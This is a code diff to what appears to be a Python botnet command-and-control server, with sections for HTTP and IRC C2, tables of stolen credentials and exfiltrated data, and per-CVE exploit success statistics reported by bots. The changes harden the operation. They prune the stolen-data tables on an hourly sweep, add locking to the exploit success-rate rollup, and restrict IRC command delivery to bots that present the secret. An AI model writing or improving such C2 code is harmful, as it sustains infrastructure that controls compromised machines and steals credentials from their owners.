@@ -141,6 +141,11 @@ def _channel_of(fn):
 
 # ─────────────────────────── state store ───────────────────────────
 
+# #215: bounded retention — max rows kept per append-only table
+# (creds/exfil/events/commands); the oldest rows beyond this cap are
+# deleted by State.prune() on main()'s hourly sweep.
+RETENTION_MAX_ROWS = 50000
+
 # #160: heartbeat cve_stats format — comma-separated
 # "CVE-YYYY-NNNN:hit|miss|fail=N" triplets (non-zero counters only).
 _CVE_STATS_RE = re.compile(r"(CVE-\d{4}-\d+):(hit|miss|fail)=(\d+)")
@@ -159,9 +164,13 @@ def parse_cve_stats(raw):
 def cve_rollup(state):
     """Aggregate every bot's cve_stats into a per-CVE success-rate table:
     {cve_id: {hit, miss, fail, total, rate}} — rate = hit % of attempts."""
+    # #214: the single sqlite connection is shared across threads
+    # (check_same_thread=False) — take State._lk like every other reader.
     roll = {}
-    for (raw,) in state.db.execute(
-            "SELECT cve_stats FROM bots WHERE cve_stats IS NOT NULL"):
+    with state._lk:
+        rows = state.db.execute(
+            "SELECT cve_stats FROM bots WHERE cve_stats IS NOT NULL").fetchall()
+    for (raw,) in rows:
         for cid, d in parse_cve_stats(raw).items():
             r = roll.setdefault(cid, {"hit": 0, "miss": 0, "fail": 0})
             for k, v in d.items():
@@ -319,6 +328,19 @@ class State:
             return self.db.execute(
                 "SELECT * FROM exfil ORDER BY id DESC LIMIT ?",
                 (limit,)).fetchall()
+
+    def prune(self):
+        """#215: bounded retention — cap append-only tables at
+        RETENTION_MAX_ROWS, deleting the OLDEST rows beyond the cap.
+        Runs opportunistically from main()'s periodic sweep, always
+        under _lk (single shared connection)."""
+        with self._lk:
+            for table in ("creds", "exfil", "events", "commands"):
+                self.db.execute(
+                    f"DELETE FROM {table} WHERE id NOT IN "
+                    f"(SELECT id FROM {table} ORDER BY id DESC "
+                    f"LIMIT {RETENTION_MAX_ROWS})")
+            self.db.commit()
 
 
 # ─────────────────────────── HTTP C2 + payload ───────────────────────────
@@ -990,6 +1012,11 @@ def handle_irc(conn, addr, c2, nick, channel):
                     break
 
         # queue-driven serve loop
+        # #210: the queue is served ONLY to connections that have presented
+        # a valid heartbeat PRIVMSG (secret-checked, same gate as HTTP/WS).
+        # An unauthenticated client that just sends NICK gets PING/PONG only;
+        # its queue requests are rejected so it can never drain bot commands.
+        authenticated = False
         deadline = time.time() + 86400
         while time.time() < deadline:
             try:
@@ -1001,15 +1028,16 @@ def handle_irc(conn, addr, c2, nick, channel):
                 log(f"IRC CLOSED {ip} — stopping queue service")
                 break
             # serve a queued command as PRIVMSG from the authorized nick
-            q = next_command(c2.queue_dir, "irc")
-            if q is not None:
-                tgt = q.get("target") or ""
-                if not tgt:
-                    c2.state.mark_served(q.get("_id", 0), bot_nick)
-                    text = f"{q.get('cmd')} {q.get('args','')}".strip()
-                    irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
-                    c2.ev(f"IRC SERVE {text}")
-                    log(f"SERVE irc -> {bot_nick} cmd={q.get('cmd')} args={q.get('args','')}")
+            if authenticated:
+                q = next_command(c2.queue_dir, "irc")
+                if q is not None:
+                    tgt = q.get("target") or ""
+                    if not tgt:
+                        c2.state.mark_served(q.get("_id", 0), bot_nick)
+                        text = f"{q.get('cmd')} {q.get('args','')}".strip()
+                        irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
+                        c2.ev(f"IRC SERVE {text}")
+                        log(f"SERVE irc -> {bot_nick} cmd={q.get('cmd')} args={q.get('args','')}")
             try:
                 data = conn.recv(4096).decode(errors="replace")
                 if data:
@@ -1036,6 +1064,9 @@ def handle_irc(conn, addr, c2, nick, channel):
                                     c2.auth_fail_count += 1  # #195
                                     log(f"AUTH-FAIL {ip}")
                                     continue
+                                # #210: valid secret — this connection is now
+                                # a verified bot and may be served the queue.
+                                authenticated = True
                                 c2.state.upsert_bot(hb, ip, "irc")
                                 # targeted command for this bot tag
                                 q = next_command(c2.queue_dir, "irc", tag=hb.get("tag"))
@@ -1494,7 +1525,10 @@ def main():
 
     signal.signal(signal.SIGTERM, _stop)
     signal.signal(signal.SIGINT, _stop)
+    # #215: opportunistic retention sweep — prune append-only tables
+    # (creds/exfil/events/commands) to RETENTION_MAX_ROWS each cycle.
     while True:
+        c2.state.prune()
         time.sleep(3600)
 
 
